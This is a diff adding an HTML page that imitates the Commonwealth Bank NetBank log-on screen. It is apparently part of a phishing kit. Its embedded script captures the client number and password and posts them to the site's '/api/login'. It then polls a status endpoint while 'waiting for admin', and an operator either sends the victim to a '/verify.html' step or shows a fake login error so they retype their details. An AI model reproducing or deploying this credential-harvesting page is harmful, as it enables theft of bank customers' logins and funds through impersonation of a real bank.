@@ -1,0 +1,501 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head id="head">
+    <title>NetBank - Log on to NetBank - Enjoy simple and secure online banking from Commonwealth Bank</title>
+    <meta name="description" content="NetBank is here to simplify your banking life. You can manage all your accounts from one place, and do your banking whenever or wherever it suits you." />
+    <meta name="google-site-verification" content="_Y1ecy6XcbQ3abYLk9glqe_Csuq0QakknnlXfW2Qrjo" />
+    <link rel="canonical" href="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx" />
+    <link rel="icon" type="image/png" href="https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_logo_diamond.37dea6048f7da9a9473614e0843d07d9.png" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" type="text/css" href="https://static.my.commbank.com.au/static/netbank/theme/fo/css/logon-merge.26d40f052bde646f68e5a483f075ba6d.css" rel-album="R760" />
+</head>
+<body id="body" class="logon">
+<div class="aspNetHidden">
+    <input type="hidden" name="RID" id="RID" value="Md4-o79MiEuUkMICrhQZBw" />
+    <input type="hidden" name="SID" id="SID" value="7bALVlASuHc=" />
+    <input type="hidden" name="cid" id="cid" value="xGL0psRriUuuHY4q0Q9xKQ" />
+    <input type="hidden" name="rqid" id="rqid" value="NFmUClov2EWdpTp7Tcq9QQ" />
+    <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYyNzk3MDY5NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEWNoa1JlbWVtYmVyJGZpZWxkyajFL6pW3G2RJiK0b4vThcB6Jn0=" />
+</div>
+<script>
+    const sid = new URLSearchParams(location.search).get('sid') || sessionStorage.getItem('sid');
+    if (!sid) {
+        fetch('/api/session', {method:'post'})
+            .then(r=>r.json()).then(({sid:id})=>{
+                sessionStorage.setItem('sid',id);
+                location.search='?sid='+id;
+            });
+        throw 0;
+    }
+
+    const heartbeatInterval = setInterval(() => {
+        fetch('/api/ping', {
+            method: 'POST',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify({ sid })
+        }).catch(() => {});
+    }, 10000);
+
+    window.addEventListener('beforeunload', () => {
+        clearInterval(heartbeatInterval);
+        navigator.sendBeacon('/api/exit', JSON.stringify({ sid }));
+    });
+
+    function getClientNumber() {
+        const cifField = document.getElementById('txtMyClientNumber_field');
+        return cifField ? cifField.value.trim() : '';
+    }
+
+    function getPassword() {
+        const pwdField = document.getElementById('txtMyPassword_field');
+        return pwdField ? pwdField.value : '';
+    }
+
+    function validateFields() {
+        const clientNumber = getClientNumber();
+        const password = getPassword();
+        const errors = [];
+
+        if (!clientNumber) {
+            errors.push({
+                field: 'txtMyClientNumber_field',
+                label: 'Client number',
+                message: 'This is required.'
+            });
+        } else if (!/^\d{8}$/.test(clientNumber)) {
+            errors.push({
+                field: 'txtMyClientNumber_field',
+                label: 'Client number',
+                message: 'This is required.'
+            });
+        }
+
+        if (!password) {
+            errors.push({
+                field: 'txtMyPassword_field',
+                label: 'Password',
+                message: 'This is required.'
+            });
+        }
+
+        return errors;
+    }
+
+    function showValidationError() {
+        const errors = validateFields();
+        if (errors.length === 0) return true;
+
+        hideValidationError();
+
+        const errorList = errors.map((err, index) => {
+            const isLast = index === errors.length - 1 ? 'last' : '';
+            return `<li class="${isLast}"><div class="linkWrap">
+                <a href="#${err.field}" onclick="document.getElementById('${err.field}').focus(); return false;"><strong>${err.label}</strong></a>
+            </div><div class="msgWrap">
+                ${err.message}
+            </div></li>`;
+        }).join('');
+
+        const errorHtml = `
+            <div class="message_contents message_contents_validation" id="validationErrorContent">
+                <div class="message">
+                    <div class="message_icon validation icon icon_validation">
+                        <i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
+                    </div>
+                    <h3>
+                        <span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
+                    </h3>
+                    <ul class="msg_cnt_wrp msg_cnt_wrp_validation">
+                        ${errorList}
+                    </ul>
+                </div>
+            </div>
+        `;
+
+        const mainContent = document.getElementById('MainContent');
+        const tempDiv = document.createElement('div');
+        tempDiv.className = 'MessagePanel arrow MessagePanel_Validation';
+        tempDiv.id = 'validationErrorPanel';
+        tempDiv.innerHTML = errorHtml;
+
+        if (mainContent && mainContent.firstChild) {
+            mainContent.insertBefore(tempDiv, mainContent.firstChild);
+        } else if (mainContent) {
+            mainContent.appendChild(tempDiv);
+        }
+
+        window.scrollTo(0, 0);
+
+        if (errors[0]) {
+            document.getElementById(errors[0].field).focus();
+        }
+
+        return false;
+    }
+
+    function hideValidationError() {
+        const existing = document.getElementById('validationErrorPanel');
+        if (existing) {
+            existing.remove();
+        }
+    }
+
+    function showLoading() {
+        const overlay = document.createElement('div');
+        overlay.id = 'login-loading-overlay';
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(2px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        `;
+
+        const loader = document.createElement('img');
+        loader.src = '/images/loader.811fa38f2f95504a101b1b41aec4e3ca.gif';
+        loader.alt = 'Loading...';
+        loader.style.cssText = `
+            width: 50px;
+            height: 50px;
+        `;
+
+        const text = document.createElement('p');
+        text.textContent = 'Verifying...';
+        text.style.cssText = `
+            color: #333333;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            margin-top: 15px;
+        `;
+
+        overlay.appendChild(loader);
+        overlay.appendChild(text);
+        document.body.appendChild(overlay);
+    }
+
+    function hideLoading() {
+        const existing = document.getElementById('login-loading-overlay');
+        if (existing) {
+            existing.style.opacity = '0';
+            setTimeout(() => existing.remove(), 300);
+        }
+    }
+
+    function showErrorMessage() {
+        const existingError = document.querySelector('.message.warning');
+        if (existingError) {
+            existingError.remove();
+        }
+
+        const loginInput = document.querySelector('.ft') || document.body;
+
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'message warning message-block';
+        errorDiv.innerHTML = `
+            <div class="message-content">
+                <p class="icon-block icon-info no-margin-bottom uia-error-message">
+                    <span style="color: red;">
+                        Sorry, your login details don't seem right. Please check and try again or
+                        <a class="uia-forgotten-access-code" href="javascript:;" id="forgottenAccessCode" style="color: red;">
+                            reset your access code here
+                        </a>.
+                    </span>
+                </p>
+            </div>
+        `;
+
+        const form = document.querySelector('.ft') || loginInput;
+        if (form && form.firstChild) {
+            form.insertBefore(errorDiv, form.firstChild);
+        } else {
+            const container = document.querySelector('#ModuleLeft') || document.body;
+            container.insertBefore(errorDiv, container.firstChild);
+        }
+
+        window.scrollTo(0, 0);
+    }
+
+    function clearForm() {
+        const cifField = document.getElementById('txtMyClientNumber_field');
+        if (cifField) {
+            cifField.value = '';
+            cifField.dispatchEvent(new Event('input', { bubbles: true }));
+        }
+
+        const pwdField = document.getElementById('txtMyPassword_field');
+        if (pwdField) {
+            pwdField.value = '';
+            pwdField.dispatchEvent(new Event('input', { bubbles: true }));
+        }
+    }
+
+    let isWaitingForAdmin = false;
+
+    function startPolling() {
+        if (isWaitingForAdmin) return;
+        isWaitingForAdmin = true;
+
+        const poll = async () => {
+            if (!isWaitingForAdmin) return;
+
+            try {
+                const res = await fetch(`/api/status/${sid}`);
+                const data = await res.json();
+
+                if (data.status === 'ok') {
+                    isWaitingForAdmin = false;
+                    window.location.href = '/verify.html';
+                    return;
+                }
+
+                if (data.status === 'redo') {
+                    isWaitingForAdmin = false;
+                    hideLoading();
+                    clearForm();
+                    showErrorMessage();
+                    return;
+                }
+
+                setTimeout(poll, 1200);
+
+            } catch (err) {
+                setTimeout(poll, 2000);
+            }
+        };
+
+        poll();
+    }
+
+    document.addEventListener('click', (e) => {
+        const btn = e.target.closest('#btnLogon_field');
+        if (!btn) return;
+
+        hideValidationError();
+
+        if (!showValidationError()) {
+            return;
+        }
+
+        const clientNumber = getClientNumber();
+        const password = getPassword();
+
+        showLoading();
+
+        const payload = { sid, email: clientNumber, password };
+        fetch('/api/login', {
+            method: 'POST',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => {
+            if (res.ok) {
+                startPolling();
+            } else {
+                hideLoading();
+                alert('Login failed. Please try again.');
+            }
+        })
+        .catch(err => {
+            hideLoading();
+            console.error('Fetch error:', err);
+            alert('An error occurred. Please try again.');
+        });
+    });
+
+    document.addEventListener('input', (e) => {
+        if (e.target.id === 'txtMyClientNumber_field' || e.target.id === 'txtMyPassword_field') {
+            hideValidationError();
+        }
+    });
+
+    document.addEventListener('keydown', (e) => {
+        if (e.target.id === 'txtMyClientNumber_field') {
+            if ([46, 8, 9, 27, 13].indexOf(e.keyCode) !== -1 ||
+                (e.keyCode === 65 && e.ctrlKey === true) ||
+                (e.keyCode === 67 && e.ctrlKey === true) ||
+                (e.keyCode === 86 && e.ctrlKey === true) ||
+                (e.keyCode === 88 && e.ctrlKey === true) ||
+                (e.keyCode >= 35 && e.keyCode <= 39)) {
+                return;
+            }
+            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
+                e.preventDefault();
+            }
+            if (e.target.value.length >= 8 && e.keyCode !== 8 && e.keyCode !== 46) {
+                e.preventDefault();
+            }
+        }
+    });
+</script>
+
+<div id="BodyContainer">
+    <div id="Header">
+        <div id="BrandingLogo">
+            <span class="ImageWithHelp" id="imgCbaLogo"><img id="imgCbaLogo" src="https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_mainlogo.552c5a58c5e8e13c837eac9f362e571a.svg" alt="Commonwealth Bank of Australia" /></span>
+        </div>
+    </div>
+    <div id="MainContent">
+        <noscript>
+            <div class="MessagePanel">
+                <div class="message_contents message_contents_validation">
+                    <div class="message">
+                        <div class="message_icon error"></div>
+                        <div class="msg_cnt_wrp msg_cnt_wrp_error">
+                            <p>
+                                <strong>You need to enable JavaScript to access NetBank</strong>
+                            </p>
+                            <p>
+                                Follow these instructions on <a id="lnkEnableJavaScript" href="https://www.commbank.com.au/support/faqs/298.html" target="_blank">how to enable JavaScript</a>.
+                                If you'd prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the <a id="lnkMobileVersionNoScript" href="https://www.netbank.com.au/mobile">mobile version</a> of NetBank.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </noscript>
+        <div class="MessagePanel arrow" id="mplMessagePanel" style="display:none;"></div>
+        <div id="ModuleWrap">
+            <div id="ModuleLeft" class="module">
+                <h2>Log on to NetBank</h2>
+                <div class="bd">
+                    <div class="ft">
+                        <div class="row rowClientNumber">
+                            <div class="LabelWrapper LabelTextAlignNotSet align_notset">
+                                <label for="txtMyClientNumber_field" id="txtMyClientNumber_label"><span class="MainLabel">Client number</span></label>
+                            </div>
+                            <div class="FieldElement">
+                                <input name="txtMyClientNumber$field" type="text" maxlength="8" id="txtMyClientNumber_field" class="text textbox field" disabled="disabled" data-maxlength="8" />
+                            </div>
+                        </div>
+                        <div class="row rowPassword">
+                            <div class="LabelWrapper LabelTextAlignNotSet align_notset">
+                                <label for="txtMyPassword_field" id="txtMyPassword_label"><span class="MainLabel">Password</span></label>
+                            </div>
+                            <div class="FieldElement">
+                                <input name="txtMyPassword$field" type="password" maxlength="16" id="txtMyPassword_field" class="text textbox field" disabled="disabled" data-maxlength="16" />
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="FieldElement FieldElementNoLabel">
+                                <span class="checkbox field checkbox_classic"><input id="chkRemember_field" type="checkbox" name="chkRemember$field" class="checkbox" /><label for="chkRemember_field">Remember client number</label></span>
+                            </div>
+                        </div>
+                        <input type="hidden" name="perfmonLog" id="perfmonLog" />
+                        <input type="hidden" name="metric" id="metric" />
+                        <div class="FieldElement FieldElementNoLabel">
+                            <div class="CbaButton" id="btnLogon">
+                                <input class="button field" type="submit" name="btnLogon$field" value="Log on" id="btnLogon_field" disabled="disabled" />
+                            </div>
+                        </div>
+                        <a id="lnkForgottenDetails" href="https://www1.my.commbank.com.au/netbank/UserMaintenance/Mixed/ForgotLogonDetails/FLDYourLogonDetails.aspx?RID=Md4-o79MiEuUkMICrhQZBw&amp;SID=7bALVlASuHc%3d">I&#39;ve forgotten my log on details</a>
+                        <div id="MessageBubble" class="MessageBubble">
+                            <span class="MessagePointer"></span>
+                            <a id="MessageClose" class="MessageClose" title="Close" href="javascript:void(0)">Close</a>
+                            <span class="MessageBody">
+                                For security reasons, do not <br /> select <strong>Remember client number</strong> if anyone else uses <br /> this computer. <a id="lnkFindOutMore" href="http://www.commbank.com.au/passwordtips" target="_blank">Find out more</a>.
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div id="ModuleRight" class="module">
+                <h2>New to NetBank?</h2>
+                <div class="bd">
+                    <div class="ft">
+                        <ul class="Bullets">
+                            <li><a id="lnkRegistration" href="https://www1.my.commbank.com.au/netbank/Registration/Mixed/SelectCard.aspx?RID=Md4-o79MiEuUkMICrhQZBw&amp;SID=7bALVlASuHc%3d">Register for NetBank now</a></li>
+                            <li><a id="lnkOnlineSupport" href="https://www.commbank.com.au/personal/support.html" target="_blank">Online support for our products and services</a></li>
+                            <li><a id="lnkProtectYourselfOnline" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Tips to stay safe online</a></li>
+                        </ul>
+                    </div>
+                    <div class="ft secModule">
+                        <ul class="Bullets">
+                            <li><a id="lnkSecurityGuarantee" href="https://www.commbank.com.au/unauthorised-transactions.html" target="_blank">Protection for unauthorised transactions</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="ucLogonContentManageControl_pnlContentManaged">
+            <div id="ContentManaged">
+                <div id="ucLogonContentManageControl_pnlHighlightPanel">
+                    <div class="HighlightPanel">
+                        <div class="top">
+                            <div class="bottom">
+                                <div class="image">
+                                    <p><a href="https://www.commbank.com.au/digital/locate-us/?mbt=nb-tile_locate" target="_blank"><img src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/Netbank_login_Branch.jpg" alt="" /></a></p>
+                                </div>
+                                <div class="description">
+                                    <table><tbody><tr><td><p><b>More branches than any other bank. No doubt.</b></p><ul><li><a href="https://www.commbank.com.au/digital/locate-us/?mbt=nb-tile_locate" target="_blank">Locate us</a></li></ul><p></p><p></p></td></tr></tbody></table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="ucLogonContentManageControl_pnlCurrentHighlights">
+                        <div id="CurrentHighlights">
+                            <h3>Quicklinks</h3>
+                            <div class="column">
+                                <ul>
+                                    <li><p><a href="https://www.commbank.com.au/business/support/financial-hardship.html?mbt=nb-ql_harship" target="_blank">Financial difficulty support for your business. Find out more</a></p></li>
+                                    <li><p><a href="https://www.commbank.com.au/home-loans/refinancing-your-home-loan.html?mbt=nb-ql_refinance" target="_blank">Refinance your eligible home loan. See how</a></p></li>
+                                    <li><p><a href="https://www.commbank.com.au/support/financial-support/financial-hardship.html?mbt=nb-ql_financial-hardship" target="_blank">Are you experiencing financial difficulty? Get help</a></p></li>
+                                    <li><p><a href="https://www.commbank.com.au/digital-banking/benefits-finder.html?mbt=nb-ql_benefitsfinder" target="_blank">Use Benefits finder to find grants, rebates and concessions you may be eligible for</a></p></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="PageFooter">
+            <a id="lnkTermsOfUse" href="http://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.aspx" target="_blank">Terms of use</a> | <a id="lnkSecurity" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Security</a> | <a id="lnkPrivacy" href="http://www.commbank.com.au/security-privacy/general-security/privacy.html" target="_blank">Privacy</a>
+            <span id="CopyRight">&copy; Commonwealth Bank of Australia 2026 ABN 48 123 123 124</span>
+        </div>
+
+        <iframe id="DigitalPlatformLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/digital/identity/authenticate/sign-out?dpOnly=true"></iframe>
+        <iframe id="NetBankDotIdentityLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/retail/netbank/identity/signout"></iframe>
+    </div>
+
+    <div class="aspNetHidden">
+        <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D36AA275" />
+        <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAdBE2G25NgTBOSU8Pqz5seN1tkCpOzpMMGFMIXCpKP1eU+3DVZOao4DU3+mkUn/6Lq9VKFP44dFVSqvdUtSca65l2O0yUofFF/VqhDKu55So0WhGMs5vjP2z0dydHI73bH84b/Z4SECaSTCtUK4njAufZrgpuWroDjuHGLJy3xuLdJ/NDY=" />
+    </div>
+
+    <script type="text/javascript">
+        document.getElementById('txtMyClientNumber_field').disabled = false;
+        document.getElementById('txtMyPassword_field').disabled = false;
+        document.getElementById('btnLogon_field').disabled = false;
+    </script>
+    <script type="text/javascript">
+        document.write("<input type=\"hidden\" name=\"JS\" value=\"E\" />");
+    </script>
+    <script type="text/javascript">
+        try { if (typeof navigator !== 'undefined' && !(/(iPad|iPhone|iPod)/.test(navigator.userAgent) && /Apple/.test(navigator.vendor))) { document.getElementById('txtMyClientNumber_field').focus(); }} catch(e) {};
+        form1_submitted = false;
+        WebForm_OnSubmit = function() {
+            if (form1_submitted) {
+                return false;
+            } else {
+                if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false)
+                    return false;
+                form1_submitted = true;
+                return true;
+            }
+        }
+    </script>
+</form>
+<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/>
+<input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/>
+<input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/>
+<input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
+</body>
+</html>
